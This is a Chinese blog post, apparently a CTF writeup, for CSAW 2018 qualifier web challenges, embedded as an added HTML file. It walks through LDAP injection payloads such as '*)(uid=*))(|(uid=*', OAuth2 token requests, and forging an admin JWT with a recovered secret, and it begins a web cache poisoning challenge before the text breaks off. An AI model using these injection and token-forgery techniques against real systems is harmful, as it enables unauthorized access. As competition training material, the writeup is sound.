@@ -1,0 +1,1005 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="jianghuxia's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="这次的web做的贼舒服，难度高，学的东西特别多，贼虚服。最近不是懒，是真忙，17号的黑盾，前前后后忙了四天，writeup后面最近才补全，福州这个去了好多次的城市，感慨颇多啊。">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAW CTF Qualification Round 2018 Writeup">
+<meta property="og:url" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/index.html">
+<meta property="og:site_name" content="jianghuxia&#39;s blog">
+<meta property="og:description" content="这次的web做的贼舒服，难度高，学的东西特别多，贼虚服。最近不是懒，是真忙，17号的黑盾，前前后后忙了四天，writeup后面最近才补全，福州这个去了好多次的城市，感慨颇多啊。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537272110586.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537272522589.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537272844469.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537273716451.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537274035389.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537274187039.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537273623996.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537274553787.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537278198873.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537275650034.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537275905514.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537279886433.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537279832302.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537280149668.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537279784379.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537274637496.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537342809395.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537343210855.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537345852973.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537346702605.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537346973458.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537351113421.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537365900771.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537365952852.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433319556.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433181250.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537406529974.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537406731871.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433574609.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433252118.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433820630.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537406901499.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407249656.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407286715.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407427066.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407642085.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407992506.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537408264849.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537408363301.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537435410792.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/6.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/short-circuit.jpg">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537436074257.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537438355628.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537236481427.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537238416590.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537441789426.png">
+<meta property="og:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537442382158.png">
+<meta property="og:updated_time" content="2018-09-24T07:41:49.980Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CSAW CTF Qualification Round 2018 Writeup">
+<meta name="twitter:description" content="这次的web做的贼舒服，难度高，学的东西特别多，贼虚服。最近不是懒，是真忙，17号的黑盾，前前后后忙了四天，writeup后面最近才补全，福州这个去了好多次的城市，感慨颇多啊。">
+<meta name="twitter:image" content="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537272110586.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/"/>
+
+
+
+
+
+  <title>CSAW CTF Qualification Round 2018 Writeup | jianghuxia's blog</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">jianghuxia's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Everyday very nice!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://jianghuxia.github.io/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="jianghuxia">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/person_image.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="jianghuxia's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CSAW CTF Qualification Round 2018 Writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-24T15:33:44+08:00">
+                2018-09-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这次的web做的贼舒服，难度高，学的东西特别多，贼虚服。最近不是懒，是真忙，17号的黑盾，前前后后忙了四天，<code>writeup</code>后面最近才补全，福州这个去了好多次的城市，感慨颇多啊。</p>
+<a id="more"></a> 
+<h4 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h4><h5 id="Ldab-ldab注入——还需理解学习"><a href="#Ldab-ldab注入——还需理解学习" class="headerlink" title="Ldab(ldab注入——还需理解学习)"></a>Ldab(ldab注入——还需理解学习)</h5><p><em>dab</em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://web.chal.csaw.io:8080</span><br></pre></td></tr></table></figure>
+<p>这题，额，不难啊，之前noxctf做过一题<code>ldab</code>注入的题目<code>Dictionary of obscure sorrows</code>，大体类似。</p>
+<p>刚开始做的时候，没注意到<code>ldab</code>，发现<code>sql</code>注入无果，后面还是看到OU、CN、SN、GivenName、UID，才反应过来。</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537272110586.png" alt="1537272110586"></p>
+<p>测试一波，发现Flag就是查不到，猜测后台过滤语句为：</p>
+<p><code>&quot;(&amp;(GivenName=&quot; + $_GET[&#39;search&#39;] + &quot;)(GivenName!=Flag))&quot;</code></p>
+<p>因此构造语句<code>$_GET[&#39;search&#39;]</code>=<code>&quot;Flag))(|(GivenName=*&quot;</code>，使得<code>&quot;(&amp;(GivenName=Flag))(|(GivenName=*&quot;)(GivenName!=Flag))&quot;</code>为永真条件即可。</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537272522589.png" alt="1537272522589"></p>
+<p>不过，后面发现构造<code>*)(uid=*))(|(uid=*</code>也是可以的。</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537272844469.png" alt="1537272844469"></p>
+<h5 id="sso（篡改Token——还需理解学习）"><a href="#sso（篡改Token——还需理解学习）" class="headerlink" title="sso（篡改Token——还需理解学习）"></a>sso（篡改Token——还需理解学习）</h5><p><code>Don&#39;t you love undocumented APIs</code></p>
+<p><code>Be the admin you were always meant to be</code></p>
+<p><code>http://web.chal.csaw.io:9000</code></p>
+<p><code>Update chal description at: 4:38 to include solve details</code></p>
+<p><code>Aesthetic update for chal at Sun 7:25 AM</code></p>
+<p>打开网页，查看源代码</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537273716451.png" alt="1537273716451"></p>
+<p>尝试访问<code>http://web.chal.csaw.io:9000/protected</code>，回显<code>Missing header: Authorization</code></p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537274035389.png" alt="1537274035389"></p>
+<p>尝试访问<code>/oauth2/token</code>，回显<code>Not Found</code>，尝试提交空post数据，弹出<code>incorrect grant_type</code></p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537274187039.png" alt="1537274187039"></p>
+<p>尝试访问<code>oauth2/authorize</code>，回显是<code>Not Found</code>，尝试提交空post数据，弹出<code>response_type not code</code></p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537273623996.png" alt="1537273623996"></p>
+<p>也就是说两个提示<code>post</code>请求方式的<code>url</code>还是缺少其他参数才能得到我们想要的回显，但是我不知道要提交啥头啊。后面做了其他题回头再看，看到<code>Welcome to our SINGLE SIGN ON PAGE WITH FULL OAUTH2.0!</code>，搜索了下<code>OAUTH2.0</code>，果然找到了一些相关的<code>rfc</code>文档—— <a href="https://tools.ietf.org/html/rfc6750" target="_blank" rel="noopener">RFC-6750</a>和 <a href="https://tools.ietf.org/html/rfc6749" target="_blank" rel="noopener">RFC-6749</a> （或者<a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" target="_blank" rel="noopener">这个</a>）</p>
+<p>其中<code>rfc6749</code>有这么一个说明，好像懂了啥</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537274553787.png" alt="1537274553787"></p>
+<p>后面构造<code>oauth2/authorize</code>的<code>post</code>数据<code>response_type=code&amp;redirect_uri=http://web.chal.csaw.io:9000/protected</code>，发现有个<code>302</code>的跳转</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537278198873.png" alt="1537278198873"></p>
+<p>也就是这些内容</p>
+<p><code>Redirecting to &lt;a href=&quot;http://web.chal.csaw.io:9000/protected?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vd2ViLmNoYWwuY3Nhdy5pbzo5MDAwL3Byb3RlY3RlZCIsImlhdCI6MTUzNzI3OTM0NSwiZXhwIjoxNTM3Mjc5OTQ1fQ.UCPeORGG0TCTiwLQznOOwwE3LTJEejZxqHKcZSYJN5s&amp;amp;state=&quot;&gt;http://web.chal.csaw.io:9000/protected?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vd2ViLmNoYWwuY3Nhdy5pbzo5MDAwL3Byb3RlY3RlZCIsImlhdCI6MTUzNzI3OTM0NSwiZXhwIjoxNTM3Mjc5OTQ1fQ.UCPeORGG0TCTiwLQznOOwwE3LTJEejZxqHKcZSYJN5s&amp;amp;state=&lt;/a&gt;.</code></p>
+<p>打开<code>http://web.chal.csaw.io:9000/protected?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vd2ViLmNoYWwuY3Nhdy5pbzo5MDAwL3Byb3RlY3RlZCIsImlhdCI6MTUzNzI3OTM0NSwiZXhwIjoxNTM3Mjc5OTQ1fQ.UCPeORGG0TCTiwLQznOOwwE3LTJEejZxqHKcZSYJN5s&amp;amp;state=</code>看看，发现回显还是<code>Missing header: Authorization</code></p>
+<p>那很好，估计现在是<code>/oauth2/token</code>的问题了，其实思路很明确了，JWT伪造。</p>
+<p>刚刚尝试访问<code>/oauth2/token</code>，回显<code>Not Found</code>，尝试提交空post数据，弹出<code>incorrect grant_type</code>，那么我们查查<code>grant_type</code>改改成啥玩意呢，在<code>rfc6749</code>中有以下内容</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537275650034.png" alt="1537275650034"></p>
+<p>所以我们设置成<code>grant_type=authorization_code</code>，接着尝试构造<code>post</code>请求数据<code>grant_type=authorization_code&amp;redirect_uri=http://web.chal.csaw.io:9000/protected</code>，提交发现</p>
+<p>回显是<code>Missing parameters</code></p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537275905514.png" alt="1537275905514"></p>
+<p>检查了下，发现少了个<code>code</code>，就是上上图的<code>grant_type</code>下面的<code>code</code>，我们先设置<code>code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vd2ViLmNoYWwuY3Nhdy5pbzo5MDAwL3Byb3RlY3RlZCIsImlhdCI6MTUzNzI3OTM0NSwiZXhwIjoxNTM3Mjc5OTQ1fQ.UCPeORGG0TCTiwLQznOOwwE3LTJEejZxqHKcZSYJN5s</code>，这个<code>code</code>其实就是上面<code>oauth2/authorize</code>的<code>post</code>请求得到的<code>302</code>的<code>code</code>。</p>
+<p>最终构造的<code>post</code>数据为：</p>
+<p><code>grant_type=authorization_code&amp;code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJodHRwOi8vd2ViLmNoYWwuY3Nhdy5pbzo5MDAwL3Byb3RlY3RlZCIsImlhdCI6MTUzNzI3OTM0NSwiZXhwIjoxNTM3Mjc5OTQ1fQ.UCPeORGG0TCTiwLQznOOwwE3LTJEejZxqHKcZSYJN5s&amp;redirect_uri=http://web.chal.csaw.io:9000/protected</code>，提交</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537279886433.png" alt="1537279886433"></p>
+<p>得到以下数据</p>
+<table>
+<thead>
+<tr>
+<th>token_type</th>
+<th>“Bearer”</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>token</td>
+<td>“eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzI3OTY4MSwiZXhwIjoxNTM3MjgwMjgxfQ.oKFQF_SrfU3DGfVlC43OuwVp6-ukTDTJVRqcc9BiRNM”</td>
+</tr>
+</tbody>
+</table>
+<p>很好，这下，我们可以看到回显了个用户<code>Bearer</code>的token，用下<code>https://jwt.io/</code>看下伪造新的<code>token</code>，我这里将<code>&quot;type&quot;:&quot;user&quot;</code>改成了<code>&quot;type&quot;:&quot;admin&quot;</code>,使用<code>ufoundme</code>为秘钥填充。</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537279832302.png" alt="1537279832302"></p>
+<p>按照上面的<code>jwt</code>构造的结果，将构造的<code>jwt</code>设置为<code>http://web.chal.csaw.io:9000/protected</code>的<code>Authorization</code>头，构造如下：</p>
+<p><code>Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWRtaW4iLCJzZWNyZXQiOiJ1Zm91bmRtZSEiLCJpYXQiOjE1MzcyNzk2ODEsImV4cCI6MTUzNzI4MDI4MX0.tLN-8JMx_mbQ4cRK6l-1C5VBLPC66mYjJKJoUcDlDkA</code></p>
+<p>得到<code>flag</code></p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537280149668.png" alt="1537280149668"></p>
+<p>，</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537279784379.png" alt="1537279784379"></p>
+<p>最终答案：<code>flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}</code></p>
+<p>后面还看了看其他大佬的做法，发现差不多，但是大佬们思路整理的很好，这是其中一个<a href="https://www.aperikube.fr/docs/csawquals_2018/sso/" target="_blank" rel="noopener">大佬整理的思路</a></p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537274637496.png" alt="1537274637496"></p>
+<h5 id="Hacker-Movie-Club-Web-缓存中毒——还需理解学习"><a href="#Hacker-Movie-Club-Web-缓存中毒——还需理解学习" class="headerlink" title="Hacker Movie Club(Web 缓存中毒——还需理解学习)"></a>Hacker Movie Club(Web 缓存中毒——还需理解学习)</h5><p><code>Hacker movies are very popular, so we needed a site that we can scale. You better get started though, there are a lot of movies to watch.</code></p>
+<p><code>Author: itszn (ret2 systems)</code></p>
+<p><code>http://app.hm.vulnerable.services/</code></p>
+<p>打开网页是这样子的</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537342809395.png" alt="1537342809395"></p>
+<p>一脸蒙蔽，看下源代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">data-src</span>=<span class="string">"mustache.min.js"</span> <span class="attr">data-cdn</span>=<span class="string">"6564ab9906a6472e43d8ad5fa6449ead2b591b7d.hm.vulnerable.services"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">data-src</span>=<span class="string">"app.js"</span> <span class="attr">data-cdn</span>=<span class="string">"6564ab9906a6472e43d8ad5fa6449ead2b591b7d.hm.vulnerable.services"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">@import url('https://fonts.googleapis.com/css?family=Orbitron');</span></span><br><span class="line"><span class="undefined">.......//此处省略</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"content"</span>&gt;</span>Loading..<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.loaded_recapcha = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.loaded_recapcha = <span class="literal">true</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.loaded_mustache = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.loaded_mustache = <span class="literal">true</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/cdn.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'https://www.google.com/recaptcha/api.js?onload=loaded_recapcha&amp;render=explicit'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>其中<code>/cdn.js</code>内容为下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> t <span class="keyword">of</span> <span class="built_in">document</span>.head.children) &#123;</span><br><span class="line">    <span class="keyword">if</span> (t.tagName !== <span class="string">'SCRIPT'</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">let</span> &#123; cdn, src &#125; = t.dataset;</span><br><span class="line">    <span class="keyword">if</span> (cdn === <span class="literal">undefined</span> || src === <span class="literal">undefined</span>)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    fetch(<span class="string">`//<span class="subst">$&#123;cdn&#125;</span>/cdn/<span class="subst">$&#123;src&#125;</span>`</span>,&#123;</span><br><span class="line">        headers: &#123;</span><br><span class="line">            <span class="string">'X-Forwarded-Host'</span>:cdn</span><br><span class="line">        &#125;&#125;</span><br><span class="line">    ).then(<span class="function"><span class="params">r</span>=&gt;</span>r.blob()).then(<span class="function"><span class="params">b</span>=&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> u = URL.createObjectURL(b);</span><br><span class="line">        <span class="keyword">let</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        s.src = u;</span><br><span 